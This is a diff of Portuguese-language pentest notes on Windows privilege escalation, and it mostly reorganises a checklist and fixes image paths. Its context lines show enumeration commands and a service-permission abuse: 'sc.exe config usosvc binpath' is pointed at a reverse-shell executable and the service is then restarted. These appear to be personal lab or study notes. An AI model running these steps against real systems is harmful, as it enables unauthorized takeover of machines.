@@ -1,11 +1,13 @@
 # Windows PrivEsc
 
-1. [Check](<Windows_PrivEsc.md#DirectoryEnum>) Navegar nos diretorios do usuario para ver se existe algo ali que possa nos fornecer uma credencial ou algum bionario que inicie um servico/programa vulneravel a escalacao de privilegio
-2. [Check](<Windows PrivEsc.md#Winpeas>) Rodar o WinPEAS para verificar se existe algum servico disponivel para exploracao com permissoes demais. Aqui temos que usar o accesschk
-3. [Check](<Windows PrivEsc.md#PowerUp>) Rodar o PowerUp
-4. [Check](<Windows PrivEsc.md#Credenciais no registro>) checar credenciais no registro do windows
+## Checklist
+
+1.  Navegar nos diretorios do usuario para ver se existe algo ali que possa nos fornecer uma credencial ou algum bionario que inicie um servico/programa vulneravel a escalacao de privilegio
+2.  Rodar o WinPEAS para verificar se existe algum servico disponivel para exploracao com permissoes demais. Aqui temos que usar o accesschk
+3.  Rodar o PowerUp
+4. checar credenciais no registro do windows
 5. checar os servicos que estao rodando na maquina para ver se temos permissao de alteracao em algum deles
-6. [Check](<Windows PrivEsc.md#ScheduledTasks>) checar as scheduleds tasks
+6. checar as scheduleds tasks
 7. verificar se existe algum servico rodando em localhost para exploracao de escalacao de privilegio
 8. em sistemas mais antigos, explorar vulnerabilidades de kernel
 9. Ja peguei cenarios em que uma maquina virtual estava instalada na maquina e foi possivel obter credenciais no historico desta mesma maquina
@@ -153,13 +155,13 @@ dir /s /b /a:-d-h \Users\alfred | findstr /i /v "appdata"
 gci 'c:\program files','c:\program files (x86)' | ft name, path, lastwritetime
 ```
 
-![qownnotes-media-PvAXBV](../media/qownnotes-media-PvAXBV.png)
+![qownnotes-media-PvAXBV](../../../media/qownnotes-media-PvAXBV.png)
 
 Exemplos que não são exploráveis:
 
-![qownnotes-media-QpQnUo](../media/qownnotes-media-QpQnUo.png)
+![qownnotes-media-QpQnUo](../../../media/qownnotes-media-QpQnUo.png)
 
-![qownnotes-media-vflhHT](../media/qownnotes-media-vflhHT.png)
+![qownnotes-media-vflhHT](../../../media/qownnotes-media-vflhHT.png)
 
 Verificar todas as pastas do(s) usuário(s):
 
@@ -306,13 +308,13 @@ dos2unix scht.txt
 cat scht.txt | grep "SYSTEM\|Task To Run" | grep -B 1 SYSTEM
 ```
 
-![qownnotes-media-MkSFLk](../media/qownnotes-media-MkSFLk.png)
+![qownnotes-media-MkSFLk](../../media/qownnotes-media-MkSFLk.png)
 
-![qownnotes-media-eaAziX](../media/qownnotes-media-eaAziX.png)
+![qownnotes-media-eaAziX](../../media/qownnotes-media-eaAziX.png)
 
-![qownnotes-media-aeBsJo](../media/qownnotes-media-aeBsJo.png)
+![qownnotes-media-aeBsJo](../../media/qownnotes-media-aeBsJo.png)
 
-![qownnotes-media-bOauze](../media/qownnotes-media-bOauze.png)
+![qownnotes-media-bOauze](../../media/qownnotes-media-bOauze.png)
 
 Usando accesschk.exe
 
@@ -385,9 +387,9 @@ Pesquisando a respeito do serviço, podemos encontrar fragilidades que podemos e
 
 ### Weak service permissions
 
-![qownnotes-media-jCADRm](../../media/qownnotes-media-jCADRm.png)
+![qownnotes-media-jCADRm](../../../media/qownnotes-media-jCADRm.png)
 
-![qownnotes-media-Yhpwrk](../../media/qownnotes-media-Yhpwrk.png)
+![qownnotes-media-Yhpwrk](../../../media/qownnotes-media-Yhpwrk.png)
 
     ./accesschk.exe -ucwqv UsoSvc /accepteula
     
@@ -397,11 +399,11 @@ Com esse comando, verificamos que estamos no grupo NTAUTHORITY/SERVICE
     
     whoami /all
 
-![qownnotes-media-zdSaRr](../../media/qownnotes-media-zdSaRr.png)
+![qownnotes-media-zdSaRr](../../../media/qownnotes-media-zdSaRr.png)
 
     sc.exe config usosvc binpath="C:\temp\revshell.exe"
 
-![qownnotes-media-QfiKZv](../../media/qownnotes-media-QfiKZv.png)
+![qownnotes-media-QfiKZv](../../../media/qownnotes-media-QfiKZv.png)
 
     net stop usosvc
     net start usosvc
